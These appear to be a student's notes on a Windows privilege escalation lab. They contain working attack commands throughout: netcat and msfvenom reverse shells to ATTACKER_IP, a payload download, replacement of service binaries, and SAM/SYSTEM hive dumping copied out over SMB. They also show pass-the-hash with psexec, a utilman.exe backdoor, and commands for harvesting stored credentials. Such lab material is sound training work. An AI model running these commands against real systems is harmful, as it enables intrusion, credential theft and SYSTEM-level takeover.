Privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

## **PowerShell & CMD**
PowerShell and Command Prompt (CMD) are both command-line interfaces (CLI) in Windows, but they have significant differences in terms of functionality, features, and design philosophy. Here's a breakdown of the key differences:
###  **Purpose and Design Philosophy**

- **CMD (Command Prompt):**
    - CMD, also known as Command Prompt or cmd.exe, is the original command-line interface in Windows. It is based on MS-DOS, and its primary purpose is to execute commands, run batch scripts (.bat files), and manage basic system tasks.
    - CMD is relatively simple and is focused on executing commands and running simple scripts.
    
- **PowerShell:**
    - PowerShell is a more advanced and modern CLI and scripting environment developed by Microsoft. It is designed to provide a more powerful and flexible tool for system administration and automation.
    - PowerShell is built on the .NET framework and integrates deeply with Windows, allowing users to manage system tasks, automate processes, and work with complex data types.
###  **Commands and Scripting**

- **CMD:**
    - CMD uses a basic set of commands inherited from MS-DOS, such as `dir`, `copy`, `del`, and `cd`. The command set is limited and primarily focused on file and directory management.
    - CMD supports batch scripting, which is straightforward but limited in terms of capabilities compared to modern scripting languages.
    - 
- **PowerShell:**
    - PowerShell uses cmdlets (pronounced "command-lets"), which are specialized .NET classes that perform a specific function. Examples include `Get-Process`, `Get-Service`, `Set-Item`, and `Invoke-Command`.
    - PowerShell scripting is far more advanced, supporting functions, loops, conditional statements, error handling, and working with complex data structures like objects, arrays, and hash tables.
### **Data Handling**

- **CMD:**
    - CMD treats everything as plain text. When you run commands, the output is typically text-based, and manipulating complex data types is challenging.
- **PowerShell:**
    - PowerShell treats output as objects, not just text. This means you can pipe the output of one cmdlet to another cmdlet and manipulate it as objects with properties and methods, allowing for much more powerful and flexible operations.
###  **Pipelines**

- **CMD:**
    - CMD supports pipelines (using `|`), but since everything is text-based, the output of one command is just text passed to the next command. This can limit the complexity of operations.
- **PowerShell:**
    - PowerShell's pipeline passes objects between cmdlets, enabling much more sophisticated data manipulation and allowing users to perform complex tasks in a streamlined manner.
### **Usability and Extensibility**

- **CMD:**
    - CMD is simpler and may be easier to use for basic tasks. However, it lacks many features that are standard in more modern shells.
    - Extensibility is limited, and it doesn’t integrate well with other modern Windows tools or environments.
- **PowerShell:**
    - PowerShell is highly extensible. You can create custom cmdlets, modules, and functions. It also integrates with a wide range of Microsoft products (like Active Directory, Exchange, etc.) and third-party tools, making it a powerful tool for administrators.
    - PowerShell ISE (Integrated Scripting Environment) provides a more user-friendly environment for writing, testing, and debugging scripts.
### **Cross-Platform Support**

- **CMD:**
    - CMD is exclusive to Windows and does not support cross-platform usage.
- **PowerShell:**
    - PowerShell Core, an open-source version of PowerShell, is cross-platform and can be used on Windows, macOS, and Linux. This makes it more versatile for managing diverse environments.

## **Windows Users**
Windows systems mainly have two kinds of users. Depending on their access levels, we can categories a user in one of the following groups:
- **Administrators**: These users have the most privileges. They can change any system configuration parameter and access any file in the system.
- **Standard Users**: These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group. 

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
- **SYSTEM / LocalSystem**: 
An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.  
- **Local Service**:
Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.  
- **Network Service**:  
Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.\

*Note:*
	These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

## **Harvesting Passwords from Usual Spots**
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.
### Unattended Windows Installation
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf (sysprep represents the place from where windows ISO image is mounted for the other machines)
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:
```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

*Note:*
	The command above will only work from *cmd.exe*, as *Powershell* won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.


### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```shell-session
runas /savecred /user:admin cmd.exe
```


### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find `web.config` in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

*Note:* 
	Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

Q)A password for the julia.jones user has been left on the Powershell history. What is the password?
	`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
	
	![[Pasted image 20240826203911.png]]

Q)A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
	`shell-session type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
	
	![[Pasted image 20240826204056.png]]

Q)There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
	`shell-session runas /savecred /user:mike.katz cmd.exe`
	![[Pasted image 20240826204231.png]]

Q)Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
	![[Pasted image 20240826204501.png]]

## **Other Quick Wins**
Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
 
 Breakdown of the Command:
- **`schtasks`**:
    - This is the primary command used to create, delete, configure, or display scheduled tasks on a local or remote machine.
- **`/query`**:
    - This option tells `schtasks` to display or query information about tasks. When used without any additional parameters, it shows a list of all scheduled tasks.
- **`/tn vulntask`**:
    - **`/tn`** stands for "task name."
    - **`vulntask`** is the specific name of the task you want to query. This parameter restricts the output to details about the task named `vulntask`.
- **`/fo list`**:
    - **`/fo`** stands for "format."
    - **`list`** specifies the format of the output. The available formats are:
        - `TABLE`: Displays the output in a table format.
        - `LIST`: Displays the output in a list format, with each property on a separate line (this is the format chosen in your command).
        - `CSV`: Displays the output in a comma-separated values format, which is useful for exporting the data.
- **`/v`**:
    - **`/v`** stands for "verbose."
    - This option provides detailed information about the task, including settings, triggers, actions, conditions, and more.

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Breakdown of the Command:
- **`icacls`**:
    - This is the command-line utility in Windows used to display or modify the access control lists (ACLs) for files and directories. ACLs define the permissions that users and groups have for accessing or modifying the file or directory.
- **`c:\tasks\schtask.bat`**:
    - This is the file path to the specific file or directory you want to query or modify. In this case, it's targeting a batch file named `schtask.bat` located in the `C:\tasks\` directory.

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

 Explanation of the Command in the Batch File:
- If `schtask.bat` is executed, it will attempt to run `nc64.exe` (Netcat) from the `c:\tools\` directory.
- The `-e cmd.exe` part tells Netcat to launch a command shell (`cmd.exe`) when a connection is made.
- The `ATTACKER_IP 4444` part tells Netcat to connect to the specified IP address (`ATTACKER_IP`) on port `4444`.

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
```shell-session
nc -lvp 4444
```

### AlwaysInstallElevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.
```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Note:
	To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt
```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


## **Abusing Service Misconfigurations**
### **Windows Services**
Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:
```shell-session
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):
	![[Pasted image 20240827204847.png]]

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:
	![[Pasted image 20240827204942.png]]

A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.


### **Insecure Permissions on Service Executable**
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:
```shell-session
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:
```shell-session
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

We can then pull the payload from Powershell with the following command:
```shell-session
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:
```shell-session
user@attackerpc$ nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart:
```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

*Note:*
	PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
```shell-session
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

### **Insecure Service Permissions**
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:
```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```

We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`.

```shell-session
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
```shell-session
C:\> sc stop THMService
C:\> sc start THMService
```

And we will receive a shell back in our attacker's machine with SYSTEM privileges:
```shell-session
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

### Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature. When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, followed by the given parameters:
```shell-session
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Now let's look at another service without proper quotation:
```shell-session
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

```

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe||
This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. We can check this using `icacls`:
```shell-session
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
```shell-session
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Once the service gets restarted, your payload should execute:
```shell-session
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

As a result, you'll get a reverse shell with svcusr2 privileges:
```shell-session
user@attackerpc$ nc -lvp 4446

```

## **Abusing dangerous privileges**
Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:
```shell-session
whoami /priv
```

A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

### **SeBackup / SeRestore**
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

- **User:** `THMBackup`
- **Password:** `CopyMaster555`

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:
			![[Pasted image 20240828151112.png]]

Once on the command prompt, we can check our privileges with the following command:
```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:
```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our attacking machine:
```shell-session
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox:
```shell-session
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:
```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP

```

### **SeTakeOwnership**
The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

- **User:** `THMTakeOwnership`
- **Password:** `TheWorldIsMine2022`

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:
			![[Pasted image 20240828151445.png]]

Once on the command prompt, we can check our privileges with the following command:
```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
		![[Pasted image 20240828154553.png]]


Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
```shell-session
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
```shell-session
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

After this, we will replace utilman.exe with a copy of cmd.exe:
```shell-session
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

To trigger utilman, we will lock our screen from the start button:
			![[Pasted image 20240828154750.png]]

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
	![[Pasted image 20240828154814.png]]


### **SeImpersonate / SeAssignPrimaryToken**
These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:
![[Pasted image 20240828165317.png]]
Several reasons why using ftp's token is not the best idea: 
- For the files to be served correctly, they would need to be accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`. This adds complexity as we must manually configure specific permissions for each served file/directory. 
- For the operating system, all files are accessed by user `ftp`, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. 
- If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the `ftp` user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:
![[Pasted image 20240828165500.png]]
Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

